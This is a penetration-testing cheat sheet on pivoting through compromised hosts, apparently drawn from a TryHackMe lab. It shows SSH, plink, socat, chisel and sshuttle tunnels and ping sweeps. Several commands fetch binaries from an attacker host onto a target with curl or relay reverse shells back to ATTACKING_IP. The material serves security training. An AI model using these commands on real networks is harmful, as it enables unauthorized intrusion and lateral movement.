# Pivoting

---

## 1.0 Intro

Pivoting is the art of using access obtained over one machine to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration testing.

![Untitled](Pivoting%207636e/Untitled.png)

There are two main methods encompassed in this area of pentesting:

- **Tunnelling/Proxying:** Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be *tunnelled* inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic **I**ntrusion **D**etection **S**ystem (IDS) or firewall
- **Port Forwarding:** Creating a connection between a local port and a single port on a target, via a compromised host

Also read my Metasploit pivoting page:

---

## 2.0 Commands & Tools

check the ARP cache of the machine (Windows and Linux):

```bash
arp -a
```

Find static mappings Linux:

```bash
cat /etc/hosts
```

Find static mappings Windows:

```bash
C:\Windows\System32\drivers\etc\hosts
```

Windows list ip configuration of all interfaces

```bash
ipconfig /all
```

Centos specifically: Allow a port to open with firewall-cmd

```bash
firewall-cmd --zone=public --add-port 15070/tcp
```

Linux reading the resolv.conf file:

```bash
nmcli dev show
```

Download static binary from host with curl:

```bash
curl ATTACKING_IP/nmap-USERNAME -o /tmp/nmap-USERNAME && chmod +x /tmp/nmap-USERNAME
```

Static binaries:

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Bash one-liner ping sweep:

```bash
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
```

Ping sweep with fping:

```bash
fping -a -g 10.10.10.0/24 2>/dev/null
```

Ping sweep with Nmap:

```bash
nmap -sn 10.10.10.0/24
```

IP route via a other router:

```bash
ip route add {new network/24, /16, /8} via {known router ip} dev {interface}
```

Port scanning if ICMP is blocked:

```bash
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```

---

## 3.0 Proxychains and Foxyproxy

When creating a proxy we open up a port on our own attacking machine which is linked to the compromised server, giving us access to the target network. Proxychains and FoxyProxy can be used to direct our traffic through this port and into our target network.

### 3.1 Proxychains

Proxychains can often slow down a connection: performing an nmap scan through it is especially hellish. Ideally you should try to use static tools where possible, and route traffic through proxychains only when required.

There is one other line in the Proxychains configuration that is worth paying attention to, specifically related to the Proxy

**DNS**

settings:

![https://assets.tryhackme.com/additional/wreath-network/3af17f6ddafc.png](https://assets.tryhackme.com/additional/wreath-network/3af17f6ddafc.png)

If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the

```
proxy_dns
```

line using a hashtag (

```
#
```

) at the start of the line before performing a scan through the proxy!

![https://assets.tryhackme.com/additional/wreath-network/557437aec525.png](https://assets.tryhackme.com/additional/wreath-network/557437aec525.png)

• You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packets (Ping requests) will also not work through the proxy, so use the  `-Pn`  switch to prevent Nmap from trying it.

• It will be *extremely* slow. Try to only use Nmap through a proxy when using the NSE (i.e. use a static binary to see where the open ports/hosts are before proxying a local copy of nmap to use the scripts library).

---

### 3.2 FoxyProxy

People frequently use this tool to manage their BurpSuite/ZAP proxy quickly and easily, but it can also be used alongside the tools we'll be looking at in subsequent tasks in order to access web apps on an internal network. FoxyProxy is a browser extension which is available for [Firefox](https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-basic/)
 and [Chrome](https://chrome.google.com/webstore/detail/foxyproxy-basic/dookpfaalaaappcdneeahomimbllocnb).

![Untitled](Pivoting%207636e/Untitled%201.png)

Once activated, all of your browser traffic will be redirected through the chosen port (so make sure the proxy is active!). Be aware that if the target network doesn't have internet access (like all TryHackMe boxes) then you will not be able to access the outside internet when the proxy is activated.

With the proxy activated, you can simply navigate to the target domain or IP in your browser and the proxy will take care of the rest!

---

## 4.0 SSH Tunnelling / Port Forwarding

The first tool we'll be looking at is none other than the bog-standard SSH client with an OpenSSH server. Using these simple tools, it's possible to create both forward and reverse connections to make SSH "tunnels", allowing us to forward ports, and/or create proxies.

### 4.1 Forward Connections

There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.

<aside>
📌 Port forwarding is accomplished with the `-L` switch

</aside>

For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:

```bash
ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
```

The `-fN`combined switch does two things: `-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.

Proxies are made using the `-D` switch, for example: `-D 1337`. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:

set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell:

```bash
ssh -D 8000 user@target.thm -fN
```

### 4.3 Reverse Connections

Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine *from* the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse connection safely, there are a few steps we need to take:

1. First, generate a new set of SSH keys and store them somewhere safe (`ssh-keygen`):This will create two new files: a private key, and a public key.
    
    ![https://assets.tryhackme.com/additional/wreath-network/62b2e09ba985.png](https://assets.tryhackme.com/additional/wreath-network/62b2e09ba985.png)
    
2. Copy the contents of the public key (the file ending with `.pub`), then edit the `~/.ssh/authorized_keys` file on your own attacking machine. You may need to create the `~/.ssh` directory and `authorized_keys` file first.
3. On a new line, type the following line, then paste in the public key:`command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty`This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.

The final entry in the `authorized_keys` file should look something like this:

![Untitled](Pivoting%207636e/Untitled%202.png)

Next. check if the SSH server on your attacking machine is running:`sudo systemctl status ssh`

If the service is running then you should get a response that looks like this (with "active" shown in the message):

![https://assets.tryhackme.com/additional/wreath-network/08746aa1021e.png](https://assets.tryhackme.com/additional/wreath-network/08746aa1021e.png)

If the status command indicates that the server is not running then you can start the ssh service with:`sudo systemctl start ssh`

The only thing left is to do the unthinkable: transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.

With the key transferred, we can then connect back with a reverse port forward using the following command:`ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN`

To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:`ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN`

This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!

In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the `-D` switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:`ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN`

This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.

---

## 5.0 plink.exe

Plink.exe is a Windows command line version of the PuTTY SSH client. Now that Windows comes with its own inbuilt SSH client, plink is less useful for modern servers; however, it is still a very useful tool, so we will cover it here.

Generally speaking, Windows servers are unlikely to have an SSH server running so our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection. This would be done with the following command:

```bash
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

The `cmd.exe /c echo y` at the start is for non-interactive shells (like most reverse shells -- with Windows shells being difficult to stabilise), in order to get around the warning message that the target has not connected to this host before.

To use our example from before, if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this command:

```bash
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
```

## 5.1 puttygen

Note that any keys generated by `ssh-keygen` will not work properly here. You will need to convert them using the `puttygen` tool, which can be installed on Kali using `sudo apt install putty-tools`.

After downloading the tool, conversion can be done with:

```bash
puttygen KEYFILE -o OUTPUT_KEY.ppk
```

On kali found at : /usr/share/windows-resources/binaries/plink.exe

---

## 6.0 Socat

Whilst the following techniques could not be used to set up a full proxy into a target network, it is quite possible to use them to successfully forward ports from both Linux and Windows compromised targets. In particular, socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:

![Untitled](Pivoting%207636e/Untitled%203.png)

It's best to think of socat as a way to join two things together -- kind of like the Portal Gun in the Portal games, it creates a link between two different locations. This could be two ports on the same machine, it could be to create a relay between two different machines, it could be to create a connection between a port and a file on the listening machine, or many other similar things. It is an extremely powerful tool, which is well worth looking into in your own time.

---

### 6.1 Download Socat

Before using socat, it will usually be necessary to download a binary for it, then upload it to the box.

Link to socat binary:

[https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)

On Kali (inside the directory containing your Socat binary):

`sudo python3 -m http.server 80`

Then, on the target:`curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME`

![https://assets.tryhackme.com/additional/wreath-network/f976be91162d.png](https://assets.tryhackme.com/additional/wreath-network/f976be91162d.png)

With the binary uploaded, let's have a look at each of the above scenarios in turn.

---

### 6.2 Reverse Shell relay

1. First let's start a standard netcat listener on our attacking box
    
    ```bash
    sudo nc -lvnp 443
    ```
    
2. Next, on the compromised server, use the following command to start the relay:
    
    ```bash
    ./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
    ```
    

From here we can then create a reverse shell to the newly opened port 8000 on the compromised server. This is demonstrated in the following screenshot, using netcat on the remote server to simulate receiving a reverse shell from the target server:

![Untitled](Pivoting%207636e/Untitled%204.png)

- `tcp-l:8000` is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.
- `tcp:ATTACKING_IP:443` connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.
- `&` backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.

---

### 6.3 Port Forwarding — Easy

The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server.

For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:

```bash
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```

This opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of 172.16.0.10.

---

### 6.4 Port Forwarding — Quiet

The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.

1. First of all, on our own attacking machine, we issue the following command:
    
    ```bash
    socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
    ```
    
2. Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:
    
    ```bash
    ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
    ```
    
3. This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:
    
    ```bash
    ./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &
    ```
    

This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to `localhost:8000` in our attacking machine's web browser to load the webpage served by the target: 172.16.0.10:80!

### 6.5 killing the socat process

Finally, we've backgrounded socat port forwards and relays, but it's important to also know how to *close* these. The solution is simple: run the `jobs` command in your terminal, then kill any socat processes using `kill %NUMBER`:

![Untitled](Pivoting%207636e/Untitled%205.png)

---

## 7.0 Chisel

[Chisel](https://github.com/jpillora/chisel) is an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not. It's written in Golang and can be easily compiled for any system (with static release binaries for Linux and Windows provided). In many ways it provides the same functionality as the standard SSH proxying / port forwarding we covered earlier; however, the fact it doesn't require SSH access on the compromised target is a big bonus.

---

### 7.1 Download Chisel

Before we can use chisel, we need to download appropriate binaries from the tool's [Github release page](https://github.com/jpillora/chisel/releases). These can then be unzipped using `gunzip`, and executed as normal:

![Untitled](Pivoting%207636e/Untitled%206.png)

<aside>
📌 You must have an appropriate copy of the chisel binary on *both the attacking machine and the compromised server.*

</aside>

You could use the webserver method covered in the previous tasks, or to shake things up a bit, you could use SCP:

```bash
scp -i KEY chisel user@target:/tmp/chisel-USERNAME
```

---

### 7.2 Chisel explained

The chisel binary has two modes: *client* and *server*. You can access the help menus for either with the command:

```bash
chisel client|server --help
```

![Untitled](Pivoting%207636e/Untitled%207.png)

We will be looking at two uses for chisel in this task (a SOCKS proxy, and port forwarding); however, chisel is a very versatile tool which can be used in many ways not described here.

---

### 7.3 Reverse Socks Proxy with Chisel

This connects back from a compromised server to a listener waiting on our attacking machine.

1. On our own attacking box we would use a command that looks something like this:
    
    ```bash
    ./chisel server -p LISTEN_PORT --reverse &
    ```
    

This sets up a listener on your chosen listen_port

1. On the compromised host, we would use the following command:
    
    ```bash
    ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
    ```
    

This command connects back to the waiting listener on our attacking box, completing the proxy. As before, we are using the ampersand symbol (&) to background the processes.

Note the use of **R:socks** in this command. "R" is prefixed to remotes (arguments that determine what is being forwarded or proxied -- in this case setting up a proxy) when connecting to a chisel server that has been started in reverse mode. It essentially tells the chisel client that the server anticipates the proxy or port forward to be made at the client side (e.g. starting a proxy on the compromised target running the client, rather than on the attacking machine running the server).

---

### 7.4 Forward Socks Proxy with Chisel

In many ways the syntax for this is simply reversed from a reverse proxy.

1. First, on the compromised host we would use:
    
    ```bash
    ./chisel server -p LISTEN_PORT --socks5
    ```
    
2. On our own attacking box we would then use:
    
    ```bash
    ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
    ```
    
    In this command, PROXY_PORT is the port that will be opened for the proxy.
    

For example, **./chisel client 172.16.0.10:8080 1337:socks** would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.

---

### 7.5 Remote Port Forward with Chisel

A remote port forward is when we connect back from a compromised target to create the forward. 

1. For a remote port forward, on our attacking machine we use the exact same command as before:
    
    ```bash
    ./chisel server -p LISTEN_PORT --reverse &
    ```
    
2. The command to connect back is slightly different this time, however:
    
    ```bash
    ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
    ```
    

You may recognise this as being very similar to the SSH reverse port forward method, where we specify the local port to open, the target IP, and the target port, separated by colons. Note the distinction between the LISTEN_PORT and the LOCAL_PORT. Here the LISTEN_PORT is the port that we started the chisel server on, and the LOCAL_PORT is the port we wish to open on our own attacking machine to link with the desired target port.

### 7.6 Local Port Forward with Chisel

As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

1. On the compromised target we set up a chisel server:
    
    ```bash
    ./chisel server -p LISTEN_PORT
    ```
    
2. We now connect to this from our attacking machine like so:
    
    ```bash
    ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
    ```
    

---

### 7.7 Kill Chisel job

As with the backgrounded socat processes, when we want to destroy our chisel connections we can use jobs to see a list of backgrounded jobs, then kill %NUMBER to destroy each of the chisel processes.

```bash
jobs
```

```bash
kill %NUMBER
```

---

## 8.0 sshuttle

This tool is quite different from the others we have covered so far. It doesn't perform a port forward, and the proxy it creates is nothing like the ones we have already seen. Instead it uses an SSH connection to create a tunnelled proxy that acts like a new interface. In short, it simulates a VPN, allowing us to route our traffic through the proxy without the use of proxychains (or an equivalent) 

Whilst this sounds like an incredible upgrade, it is not without its drawbacks. For a start, sshuttle only works on Linux targets. It also requires access to the compromised server via SSH, and Python also needs to be installed on the server.

---

### 8.1 Download sshuttle

```bash
sudo apt install sshuttle
```

---

### 8.2 sshuttle usage

The base command for connecting to a server with sshuttle is as follows:

```bash
sshuttle -r username@address subnet
```

For example, in our fictional 172.16.0.x network with a compromised server at 172.16.0.5, the command may look something like this:

```bash
sshuttle -r user@172.16.0.5 172.16.0.0/24
```

Shuttle with private key ssh:

```bash
sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24
```

Exclude a IP:

```bash
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
```